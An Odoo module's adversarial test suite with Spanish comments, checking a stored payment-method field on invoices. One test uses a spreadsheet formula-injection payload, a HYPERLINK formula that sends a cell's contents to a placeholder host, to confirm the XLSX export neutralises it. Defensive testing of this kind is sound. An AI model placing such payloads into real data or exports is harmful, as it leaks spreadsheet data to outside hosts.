"""Revisión adversarial independiente de «Forma de pago» (campo guardado de ``account.move``).

Cada prueba afirma lo que DEBERÍA pasar: si falla, es un hallazgo (el nombre dice cuál).
Revisión adversarial pasada al repositorio.
"""
import json

from odoo import Command, http
from odoo.exceptions import AccessError, UserError
from odoo.tests import HttpCase, tagged

from .test_forma_pago import DIA, FormaPagoCommon


def columna(env, factura):
    """Lo que hay de verdad guardado en la base (no la caché)."""
    env.flush_all()
    env.cr.execute('SELECT dcasa_forma_pago FROM account_move WHERE id = %s', (factura.id,))
    return env.cr.fetchone()[0]


def relacion(env, factura):
    env.flush_all()
    env.cr.execute('SELECT journal_id FROM dcasa_move_diario_pago_rel WHERE move_id = %s ORDER BY journal_id',
                   (factura.id,))
    return [fila[0] for fila in env.cr.fetchall()]


@tagged('post_install', '-at_install')
class TestRevisionCalculo(FormaPagoCommon):

    # --- idioma ---------------------------------------------------------------------------------------------
    def test_el_texto_guardado_no_depende_del_idioma_de_quien_lo_calcula(self):
        """``account.journal.name`` es traducible: el texto guardado sale del ``display_name`` en el idioma de quien
        dispara el cálculo (un cron, un webhook, la actualización del módulo corren sin idioma). Un mismo diario
        no puede quedar escrito «Bank» en unas facturas y «Banco» en otras."""
        self.env['res.lang']._activate_lang('es_419')
        banco = self.env['account.journal'].create({'name': 'Bank revision', 'type': 'bank', 'code': 'BREV'})
        banco.with_context(lang='es_419').name = 'Banco revision'
        self.assertEqual(banco.with_context(lang='es_419').display_name, 'Banco revision')
        self.assertEqual(banco.with_context(lang='en_US').display_name, 'Bank revision')
        Factura = self.env['account.move']
        textos = {}
        for lang in ('en_US', 'es_419'):
            factura = self.factura()
            self.pago(factura, 1000.0, banco)
            self.env.flush_all()
            yo = factura.with_context(lang=lang)
            yo.env.add_to_compute(Factura._fields['dcasa_forma_pago'], yo)
            yo.env.add_to_compute(Factura._fields['dcasa_diario_pago_ids'], yo)
            self.assertIsNotNone(yo.dcasa_forma_pago)      # el cálculo corre en el contexto de este idioma
            textos[lang] = columna(self.env, factura)
        self.assertEqual(textos['en_US'], textos['es_419'], f'mismo diario, dos textos guardados: {textos}')

    # --- la verdad (conciliación real) -----------------------------------------------------------------------
    def verdad(self, factura):
        """Los diarios de los pagos de cliente aplicados, mirando solo lo conciliado de verdad."""
        lineas = factura.line_ids.filtered(lambda linea: linea.account_id.account_type == 'asset_receivable')
        parciales = lineas.matched_debit_ids | lineas.matched_credit_ids
        pagos = self.env['account.payment']
        for parcial in parciales:
            for linea in (parcial.debit_move_id | parcial.credit_move_id):
                pagos |= self.env['account.payment'].search([('move_id', '=', linea.move_id.id)])
        pagos = pagos.filtered_domain(self.env['account.move']._dcasa_dominio_de_pago_que_cuenta())
        return sorted(set(pagos.journal_id.mapped('display_name')), key=str.casefold)

    def comprobar(self, factura):
        esperado = ' + '.join(self.verdad(factura))
        self.assertEqual(columna(self.env, factura) or '', esperado)

    def test_diario_archivado_despues_del_pago(self):
        factura = self.factura()
        self.pago(factura, 400.0, self.yappy)
        self.yappy.active = False
        self.pago(factura, 600.0, self.efectivo)
        self.assertEqual(self.forma(factura), 'Efectivo forma pago + Yappy forma pago')
        self.comprobar(factura)

    def test_pagos_de_varias_facturas_a_la_vez(self):
        a, b, c = self.factura(300.0), self.factura(700.0), self.factura(100.0)
        Registro = self.env['account.payment.register'].with_context(
            active_model='account.move', active_ids=(a | b).ids)
        pagos = Registro.create({'payment_date': DIA, 'journal_id': self.tarjeta.id,
                                 'group_payment': True})._create_payments()
        self.assertEqual(len(pagos), 1, 'un solo pago para las dos facturas')
        self.assertEqual(self.forma(a), 'Tarjeta forma pago')
        self.assertEqual(self.forma(b), 'Tarjeta forma pago')
        self.assertFalse(self.forma(c))
        pagos = self.env['account.payment.register'].with_context(
            active_model='account.move', active_ids=c.ids).create({
                'payment_date': DIA, 'journal_id': self.yappy.id})._create_payments()
        self.assertEqual(self.forma(c), 'Yappy forma pago')
        for factura in (a, b, c):
            self.comprobar(factura)

    def test_un_pago_aplicado_a_dos_facturas_en_parte(self):
        """El mismo pago reparte lo suyo entre dos facturas: las dos dicen el diario; anularlo las limpia a ambas."""
        a, b = self.factura(300.0), self.factura(700.0)
        pago = self.env['account.payment'].create({
            'payment_type': 'inbound', 'partner_type': 'customer', 'partner_id': self.cliente.id, 'amount': 500.0,
            'journal_id': self.efectivo.id, 'date': DIA})
        pago.action_post()
        for factura in (a, b):
            por_cobrar = pago.move_id.line_ids.filtered(
                lambda linea: linea.account_id.account_type == 'asset_receivable' and not linea.reconciled)
            factura.js_assign_outstanding_line(por_cobrar.id) if por_cobrar else None
        self.assertEqual(self.forma(a), 'Efectivo forma pago')
        self.assertEqual(self.forma(b), 'Efectivo forma pago')
        pago.action_cancel()
        self.assertFalse(self.forma(a))
        self.assertFalse(self.forma(b))

    def test_conciliar_y_desconciliar_directo_por_el_orm_sin_el_asistente(self):
        """Sin ``matched_payment_ids`` (solo ``reconcile()``): cuenta; ``remove_move_reconcile`` la limpia."""
        factura = self.factura()
        pago = self.env['account.payment'].create({
            'payment_type': 'inbound', 'partner_type': 'customer', 'partner_id': self.cliente.id, 'amount': 1000.0,
            'journal_id': self.efectivo.id, 'date': DIA})
        pago.action_post()
        lineas = (pago.move_id.line_ids | factura.line_ids).filtered(
            lambda linea: linea.account_id.account_type == 'asset_receivable' and not linea.reconciled)
        lineas.reconcile()
        self.assertFalse(factura.matched_payment_ids)
        self.assertEqual(self.forma(factura), 'Efectivo forma pago')
        lineas.remove_move_reconcile()
        self.assertFalse(self.forma(factura))
        self.assertFalse(factura.dcasa_diario_pago_ids)

    def test_poner_la_factura_pagada_en_borrador_y_volver_a_publicar(self):
        factura = self.factura()
        self.pago(factura, 1000.0, self.yappy)
        self.assertEqual(self.forma(factura), 'Yappy forma pago')
        factura.button_draft()
        self.comprobar(factura)       # la conciliación sigue en pie: Odoo la sigue dando por pagada
        factura.action_post()
        self.comprobar(factura)

    def test_cambiar_el_diario_de_un_pago_ya_publicado(self):
        factura = self.factura()
        pago = self.pago(factura, 1000.0, self.yappy)
        try:
            pago.journal_id = self.tarjeta
        except (UserError, AccessError):
            self.skipTest('Odoo no deja cambiar el diario de un pago publicado')
        self.comprobar(factura)

    def test_asiento_manual_conciliado_no_es_un_pago_y_no_rompe(self):
        factura = self.factura()
        por_cobrar = factura.line_ids.filtered(lambda linea: linea.account_id.account_type == 'asset_receivable')
        ingreso = self.env['account.account'].search([('account_type', '=', 'income')], limit=1)
        general = self.env['account.journal'].search([('type', '=', 'general')], limit=1)
        asiento = self.env['account.move'].create({
            'move_type': 'entry', 'date': DIA, 'journal_id': general.id, 'line_ids': [
                Command.create({'account_id': por_cobrar.account_id.id, 'partner_id': self.cliente.id,
                                'credit': 1000.0, 'debit': 0.0}),
                Command.create({'account_id': ingreso.id, 'debit': 1000.0, 'credit': 0.0})]})
        asiento.action_post()
        (por_cobrar | asiento.line_ids.filtered(lambda linea: linea.account_id == por_cobrar.account_id)).reconcile()
        self.assertEqual(factura.payment_state, 'paid')
        self.assertEqual(self.forma(factura), 'Sin pago registrado', 'pagada, pero sin un pago de Odoo')

    def test_cobro_conciliado_directo_con_el_extracto_del_banco(self):
        """Pregunta abierta de la propia rama (docs/CONTABILIDAD.md): una factura pagada conciliando la línea del
        extracto del banco directo contra la factura (sin «Registrar pago») queda «Pagada»; la columna no puede quedar
        en blanco (es lo que dice una factura sin cobrar): dice «Sin pago registrado» (decisión del 2026-11-20, sin
        decidir por la contadora)."""
        factura = self.factura()
        por_cobrar = factura.line_ids.filtered(lambda linea: linea.account_id.account_type == 'asset_receivable')
        extracto = self.env['account.bank.statement.line'].create({
            'journal_id': self.yappy.id, 'amount': 1000.0, 'date': DIA, 'payment_ref': 'Yappy revision',
            'partner_id': self.cliente.id})
        asiento = extracto.move_id
        asiento.button_draft()
        otra = asiento.line_ids.filtered(lambda linea: linea.account_id != self.yappy.default_account_id)
        otra.write({'account_id': por_cobrar.account_id.id, 'partner_id': self.cliente.id})
        asiento.action_post()
        (por_cobrar | asiento.line_ids.filtered(lambda linea: linea.account_id == por_cobrar.account_id)).reconcile()
        self.assertIn(factura.payment_state, ('paid', 'in_payment'))
        self.assertEqual(self.forma(factura), 'Sin pago registrado',
                         'factura pagada por el extracto del banco: no hay un pago del que sacar el diario')
        self.assertFalse(factura.dcasa_diario_pago_ids)
        # Una factura sin cobrar sigue en blanco.
        self.assertFalse(self.forma(self.factura()))

    def test_nota_de_credito_aplicada_a_varias_facturas(self):
        a, b = self.factura(300.0), self.factura(200.0)
        nota = self.env['account.move'].create({
            'move_type': 'out_refund', 'partner_id': self.cliente.id, 'invoice_date': DIA,
            'invoice_line_ids': [Command.create({'product_id': self.mueble.id, 'quantity': 1, 'price_unit': 500.0})]})
        nota.action_post()
        por_cobrar = nota.line_ids.filtered(lambda linea: linea.account_id.account_type == 'asset_receivable')
        a.js_assign_outstanding_line(por_cobrar.id)
        b.js_assign_outstanding_line(por_cobrar.id)
        self.assertEqual(self.forma(a), 'Nota de crédito')
        self.assertEqual(self.forma(b), 'Nota de crédito')
        self.assertFalse(self.forma(nota))

    def test_factura_sin_cliente_en_borrador_no_rompe(self):
        borrador = self.env['account.move'].create({
            'move_type': 'out_invoice', 'invoice_date': DIA,
            'invoice_line_ids': [Command.create({'product_id': self.mueble.id, 'quantity': 1, 'price_unit': 10.0})]})
        self.assertFalse(self.forma(borrador))
        borrador.partner_id = self.cliente
        self.assertFalse(self.forma(borrador))

    def test_recibo_de_cliente_cobrado(self):
        recibo = self.env['account.move'].create({
            'move_type': 'out_receipt', 'partner_id': self.cliente.id, 'invoice_date': DIA,
            'invoice_line_ids': [Command.create({'product_id': self.mueble.id, 'quantity': 1, 'price_unit': 80.0})]})
        recibo.action_post()
        self.env['account.payment.register'].with_context(
            active_model='account.move', active_ids=recibo.ids).create({
                'payment_date': DIA, 'journal_id': self.efectivo.id})._create_payments()
        self.assertEqual(self.forma(recibo), 'Efectivo forma pago')

    def test_pago_sin_asiento_en_proceso_cuenta_y_anulado_no(self):
        """Odoo ata a la factura un pago sin asiento (``matched_payment_ids`` sin ``move_id``); mientras está en
        proceso la factura queda «en pago» y dice el diario; anulado, deja de decirlo."""
        factura = self.factura()
        pago = self.env['account.payment'].create({
            'payment_type': 'inbound', 'partner_type': 'customer', 'partner_id': self.cliente.id, 'amount': 1000.0,
            'journal_id': self.efectivo.id, 'date': DIA, 'invoice_ids': [Command.set(factura.ids)]})
        self.env.cr.execute('UPDATE account_payment SET move_id = NULL, state = %s WHERE id = %s',
                            ('in_process', pago.id))   # simula un pago sin asiento
        pago.invalidate_recordset()
        factura.invalidate_recordset()
        self.env.add_to_compute(self.env['account.move']._fields['dcasa_forma_pago'], factura)
        self.assertEqual(self.forma(factura), 'Efectivo forma pago')

    def test_pago_en_otra_moneda(self):
        eur = self.env.ref('base.EUR')
        eur.active = True
        self.env['res.currency.rate'].create({'currency_id': eur.id, 'name': '2025-01-01', 'rate': 0.9,
                                              'company_id': self.env.company.id})
        diario = self.env['account.journal'].create({
            'name': 'Banco euro revision', 'type': 'bank', 'code': 'EUREV', 'currency_id': eur.id})
        factura = self.factura()
        self.env['account.payment.register'].with_context(
            active_model='account.move', active_ids=factura.ids).create({
                'payment_date': DIA, 'journal_id': diario.id, 'currency_id': eur.id, 'amount': 450.0
            })._create_payments()
        texto = self.forma(factura)
        self.assertIn('Banco euro revision', texto)
        self.assertEqual(texto, 'Banco euro revision (EUR)')   # informativo: el diario en otra moneda lleva su código

    # --- nombres raros ------------------------------------------------------------------------------------
    def test_nombres_de_diario_con_comas_comillas_html_y_signo_mas(self):
        raro = self.env['account.journal'].create({
            'name': 'Yappy, "Negocios" + <b>x</b> & Co', 'type': 'bank', 'code': 'RARO'})
        factura = self.factura()
        self.pago(factura, 400.0, raro)
        self.pago(factura, 600.0, self.efectivo)
        self.assertEqual(self.forma(factura), 'Efectivo forma pago + Yappy, "Negocios" + <b>x</b> & Co')
        fila = factura.with_user(self.gerencia).export_data(['name', 'dcasa_forma_pago'])['datas'][0]
        self.assertEqual(fila[1], 'Efectivo forma pago + Yappy, "Negocios" + <b>x</b> & Co')
        self.assertEqual(self.env['account.move'].search_count(
            [('id', '=', factura.id), ('dcasa_forma_pago', 'ilike', '<b>x</b>')]), 1)

    # --- el cálculo no debe quedar viejo ------------------------------------------------------------------
    def test_desconciliar_una_nota_aplicada_a_dos_facturas_limpia_solo_la_suya(self):
        a, b = self.factura(300.0), self.factura(200.0)
        nota = self.env['account.move'].create({
            'move_type': 'out_refund', 'partner_id': self.cliente.id, 'invoice_date': DIA,
            'invoice_line_ids': [Command.create({'product_id': self.mueble.id, 'quantity': 1, 'price_unit': 500.0})]})
        nota.action_post()
        por_cobrar = nota.line_ids.filtered(lambda linea: linea.account_id.account_type == 'asset_receivable')
        a.js_assign_outstanding_line(por_cobrar.id)
        b.js_assign_outstanding_line(por_cobrar.id)
        parcial_a = (a.line_ids.matched_debit_ids | a.line_ids.matched_credit_ids)
        a.js_remove_outstanding_partial(parcial_a.id)
        self.assertFalse(self.forma(a))
        self.assertEqual(self.forma(b), 'Nota de crédito')

    def test_revertir_el_asiento_de_un_pago_en_dos_pasos(self):
        factura = self.factura()
        self.pago(factura, 400.0, self.efectivo)
        yappy = self.pago(factura, 600.0, self.yappy)
        reverso = yappy.move_id._reverse_moves([{'date': DIA}])
        reverso.action_post()
        self.comprobar(factura)
        self.comprobar(factura)

    def test_sql_borrar_conciliacion_deja_viejo_documentado(self):
        """Solo para dejar el límite a la vista: borrar por SQL no se entera nadie (nadie lo hace)."""
        factura = self.factura()
        self.pago(factura, 1000.0, self.efectivo)
        self.env.flush_all()
        self.env.cr.execute('DELETE FROM account_partial_reconcile')
        self.env.invalidate_all()
        self.assertEqual(self.forma(factura), 'Efectivo forma pago', 'por SQL el campo no se entera (esperado)')


@tagged('post_install', '-at_install')
class TestRevisionFormulario(FormaPagoCommon):

    def test_la_traduccion_de_nota_de_credito_no_cambia_con_el_idioma(self):
        self.env['res.lang']._activate_lang('es_419')
        factura = self.factura()
        self.nota(factura, DIA, precio=100.0)
        self.assertEqual(factura.with_context(lang='en_US').dcasa_forma_pago, 'Nota de crédito')

    def test_onchange_de_una_factura_cobrada_no_borra_la_forma_de_pago(self):
        """Editar una factura cobrada en el formulario (por ejemplo el plazo de pago) dispara un ``onchange`` sobre un
        registro nuevo: el valor guardado no debería salir vacío en la respuesta (el formulario ya lo ocultaría)."""
        factura = self.factura()
        self.pago(factura, 1000.0, self.yappy)
        spec = {'dcasa_forma_pago': {}, 'invoice_payment_term_id': {}, 'invoice_date_due': {}, 'line_ids': {
            'fields': {}}, 'ref': {}}
        valores = {'id': factura.id, 'dcasa_forma_pago': factura.dcasa_forma_pago, 'ref': 'x',
                   'invoice_payment_term_id': False, 'invoice_date_due': str(DIA)}
        resultado = factura.onchange(valores, ['invoice_payment_term_id'], spec)
        valor = resultado.get('value', {})
        self.assertTrue(valor.get('dcasa_forma_pago', factura.dcasa_forma_pago),
                        f'el onchange devolvió la forma de pago vacía: {valor.get("dcasa_forma_pago")!r}')


@tagged('post_install', '-at_install')
class TestRevisionPortal(FormaPagoCommon, HttpCase):
    """Lo que ve un cliente del portal: su propia factura."""

    def setUp(self):
        super().setUp()
        self.portal = self.env['res.users'].with_context(no_reset_password=True).create({
            'name': 'Portal revision', 'login': 'portal_revision', 'password': 'portal_revision',
            'partner_id': self.cliente.id,
            'group_ids': [Command.set([self.env.ref('base.group_portal').id])]})
        self.factura_pagada = self.factura()
        self.pago(self.factura_pagada, 400.0, self.yappy)
        self.pago(self.factura_pagada, 600.0, self.efectivo)

    def rpc(self, modelo, metodo, *args, **kwargs):
        respuesta = self.url_open('/web/dataset/call_kw', data=json.dumps({
            'jsonrpc': '2.0', 'method': 'call', 'id': 1,
            'params': {'model': modelo, 'method': metodo, 'args': list(args), 'kwargs': kwargs}}),
            headers={'Content-Type': 'application/json'})
        return respuesta.json()

    def test_el_portal_solo_lee_de_la_forma_de_pago_lo_que_odoo_ya_le_muestra(self):
        """El texto trae los nombres de los diarios: no es información nueva para el cliente si la factura que le
        muestra Odoo (portal y PDF, sección de pagos) ya los dice. Y los diarios como relación no se le ofrecen."""
        self.authenticate('portal_revision', 'portal_revision')
        leido = self.rpc('account.move', 'read', [self.factura_pagada.id], ['dcasa_forma_pago'])
        nombres = set(leido['result'][0]['dcasa_forma_pago'].split(' + '))
        pagina = self.url_open(f'/my/invoices/{self.factura_pagada.id}').text
        informe = self.env['ir.actions.report']._render_qweb_html(
            'account.report_invoice', self.factura_pagada.ids)[0].decode()
        for nombre in nombres:
            with self.subTest(nombre):
                self.assertTrue(nombre in pagina or nombre in informe, f'«{nombre}» solo lo dice el campo nuevo')
        otro = self.rpc('account.move', 'read', [self.factura_pagada.id], ['dcasa_diario_pago_ids'])
        self.assertIn('error', otro, 'los diarios (campo con groups) no se le ofrecen al portal')

    def test_el_portal_no_ve_la_forma_de_pago_en_sus_paginas(self):
        self.authenticate('portal_revision', 'portal_revision')
        for ruta in ('/my/invoices', f'/my/invoices/{self.factura_pagada.id}'):
            respuesta = self.url_open(ruta)
            self.assertEqual(respuesta.status_code, 200, ruta)
            self.assertNotIn('forma pago', respuesta.text, ruta)


@tagged('post_install', '-at_install')
class TestRevisionExcelFormulas(FormaPagoCommon, HttpCase):
    """El Excel de Gerencia con texto que escribió un cliente (nombre, referencia) o un diario."""

    def test_el_xlsx_no_convierte_en_formula_lo_que_escribio_un_cliente(self):
        cliente = self.env['res.partner'].create({'name': '=2+2 cliente revision'})
        factura = self.env['account.move'].create({
            'move_type': 'out_invoice', 'partner_id': cliente.id, 'invoice_date': DIA,
            'ref': '=HYPERLINK("http://ejemplo.invalid/?x="&A1,"ver")',
            'invoice_line_ids': [Command.create({'product_id': self.mueble.id, 'quantity': 1, 'price_unit': 10.0})]})
        factura.action_post()
        diario = self.env['account.journal'].create({'name': '=1+1 diario revision', 'type': 'bank', 'code': 'FREV'})
        self.pago(factura, 10.0, diario)
        self.gerencia.password = 'gerencia_rol'
        self.authenticate('gerencia_rol', 'gerencia_rol')
        campos = [('name', 'Número', 'char'), ('invoice_partner_display_name', 'Cliente', 'char'),
                  ('ref', 'Referencia', 'char'), ('dcasa_forma_pago', 'Forma de pago', 'char')]
        respuesta = self.url_open('/web/export/xlsx', data={
            'data': json.dumps({'context': {}, 'domain': [], 'groupby': [], 'ids': factura.ids, 'import_compat': False,
                                'model': 'account.move',
                                'fields': [{'name': n, 'label': e, 'type': t} for n, e, t in campos]}),
            'csrf_token': http.Request.csrf_token(self)})
        self.assertEqual(respuesta.status_code, 200)
        import io
        import zipfile
        with zipfile.ZipFile(io.BytesIO(respuesta.content)) as libro:
            hoja = libro.read('xl/worksheets/sheet1.xml').decode()
        import re
        formulas = re.findall(r'<f>(.*?)</f>', hoja)
        self.assertFalse(formulas, f'texto de un cliente o de un diario quedó como fórmula en el Excel: {formulas}')


@tagged('post_install', '-at_install')
class TestRevisionNavegador(FormaPagoCommon, HttpCase):
    """La lista de Facturas de verdad, en el navegador, con una factura cobrada con dos diarios."""

    CUERPO = """
(async () => {
    const esperar = async (cond, ms = 15000) => {
        const t0 = Date.now();
        while (!cond()) { if (Date.now() - t0 > ms) { throw new Error('no apareció: ' + cond); }
                          await new Promise(r => setTimeout(r, 100)); }
    };
    await esperar(() => document.querySelector('.o_list_view, .o_kanban_view'));
    const celular = window.innerWidth < 600;
    if (celular) {
        await esperar(() => document.querySelector('.o_dcasa_forma_pago'));
        const tarjeta = document.querySelector('.o_dcasa_forma_pago');
        if (!tarjeta.textContent.trim()) { throw new Error('la tarjeta sale vacía'); }
    } else {
        await esperar(() => document.querySelector('.o_list_table th[data-name="dcasa_forma_pago"]'));
        const celda = [...document.querySelectorAll('.o_data_cell[name="dcasa_forma_pago"]')]
            .find(c => c.textContent.trim());
        if (!celda) { throw new Error('ninguna fila trae la forma de pago'); }
        const caja = document.querySelector('.o_list_renderer');
        if (caja.scrollWidth > caja.clientWidth + 1) { throw new Error('la lista se desliza de lado a ' + innerWidth); }
    }
    console.log('test successful');
})();
"""

    def test_la_lista_y_la_tarjeta_se_ven(self):
        factura = self.factura()
        self.pago(factura, 400.0, self.efectivo)
        self.pago(factura, 600.0, self.yappy)
        for tamano in ('1440x900', '390x844'):
            with self.subTest(tamano=tamano):
                self.browser_size = tamano
                self.browser_js('/odoo/action-account.action_move_out_invoice_type', self.CUERPO, login='gerencia_rol')
